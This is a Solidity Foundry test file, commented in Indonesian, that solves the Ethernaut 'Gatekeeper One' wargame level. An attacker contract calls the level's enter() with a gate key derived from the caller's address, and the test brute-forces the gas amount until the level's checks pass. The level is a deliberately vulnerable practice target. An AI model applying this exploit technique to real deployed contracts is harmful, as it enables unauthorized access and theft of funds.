// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

// 1. KONTRAK PENYERANG
contract GatekeeperHack {
    IGatekeeperOne target;

    constructor(address _target) {
        target = IGatekeeperOne(_target);
    }

    function enter(uint256 gasToUse, bytes8 gateKey) external {

        (bool success, ) = address(target).call{gas: gasToUse}(
            abi.encodeWithSignature("enter(bytes8)", gateKey)
        );
        require(success, "Gagal Masuk Gate");
    }
}

interface IEthernaut {
    function createLevelInstance(address _level) external payable;
    function submitLevelInstance(address _instance) external;
}

contract EthernautGatekeeperOneTest is Test {
    IEthernaut ethernaut = IEthernaut(0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6);
    address levelFactory = 0xb5858B8EDE0030e46C0Ac1aaAedea8Fb71EF423C; 

    function testLevel13_GatekeeperOne() public {

        address hacker = makeAddr("hacker"); 

        vm.startPrank(hacker, hacker); 

        vm.recordLogs();
        ethernaut.createLevelInstance(levelFactory);
        
        Vm.Log[] memory entries = vm.getRecordedLogs();
        bytes32 instanceTopic = entries[entries.length - 1].topics[2];
        address levelAddr = address(uint160(uint256(instanceTopic)));
        
        console.log("Target Address:", levelAddr);

        uint16 lastTwoBytes = uint16(uint160(hacker));
        
        
        bytes8 gateKey = bytes8(uint64(1 << 60) + uint64(lastTwoBytes));

        console.log("Gate Key:");
        console.logBytes8(gateKey);

        GatekeeperHack hackContract = new GatekeeperHack(levelAddr);
        
        console.log("Mulai Brute Force Gas...");
                
        for (uint256 i = 0; i < 8191; i++) {
            
            try hackContract.enter(8191 * 3 + i, gateKey) {
                console.log("SUKSES! Gas yang pas adalah offset:", i);
                break;
            } catch {

            }
        }

        (bool s, bytes memory d) = levelAddr.staticcall(abi.encodeWithSignature("entrant()"));
        address entrant = abi.decode(d, (address));
        console.log("Entrant Akhir:", entrant);
        
        assertEq(entrant, hacker);
        console.log("HACKED! Gerbang terbuka.");
        
        ethernaut.submitLevelInstance(levelAddr);
        vm.stopPrank();
    }
}